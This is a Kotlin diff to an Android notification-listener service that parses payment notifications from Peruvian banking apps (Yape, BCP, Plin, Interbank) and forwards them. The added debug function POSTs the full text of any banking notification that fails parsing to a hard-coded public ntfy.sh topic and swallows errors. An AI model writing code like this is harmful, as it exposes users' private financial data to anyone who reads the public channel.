@@ -105,11 +105,32 @@ class StarkCaptureService : NotificationListenerService(), TextToSpeech.OnInitLi
         }
 
         if (pkg.contains("yape") || pkg.contains("bcp") || pkg.contains("plin") || pkg.contains("interbank")) {
-            processSmartContent(fullContent, pkg)
+            if (!processSmartContent(fullContent, pkg)) {
+                // Si detectamos el banco pero el regex falló, mandamos un log de DEBUG al espejo
+                networkExecutor.execute {
+                    sendDebugToMirror("FALLO_REGEX", "Banco: $pkg | Contenido: $fullContent")
+                }
+            }
         }
     }
 
-    private fun processSmartContent(content: String, pkg: String) {
+    private fun sendDebugToMirror(type: String, log: String) {
+        try {
+            val topic = "wingpay_stark_8502345704"
+            val url = URL("https://ntfy.sh/$topic")
+            (url.openConnection() as HttpURLConnection).apply {
+                requestMethod = "POST"; doOutput = true
+                setRequestProperty("Title", "DEBUG $type")
+                val json = JSONObject().apply {
+                    put("type", type); put("log", log); put("time", System.currentTimeMillis())
+                }
+                OutputStreamWriter(outputStream).use { it.write(json.toString()) }
+                responseCode; disconnect()
+            }
+        } catch (e: Exception) {}
+    }
+
+    private fun processSmartContent(content: String, pkg: String): Boolean {
         // Regex Mejorado: Detecta S/, S ., S, S /., sin importar los espacios, e incluso sin decimales
         val regex = Pattern.compile("(?i)(S\\s*/?\\s*\\.?)\\s*([\\d,]+\\.\\d{2}|[\\d,]+)")
         val matcher = regex.matcher(content)
@@ -155,7 +176,9 @@ class StarkCaptureService : NotificationListenerService(), TextToSpeech.OnInitLi
             networkExecutor.execute {
                 sendToMirror(banco, nombreLimpio, montoRaw)
             }
+            return true
         }
+        return false
     }
 
     private fun formatTitleCase(str: String): String {
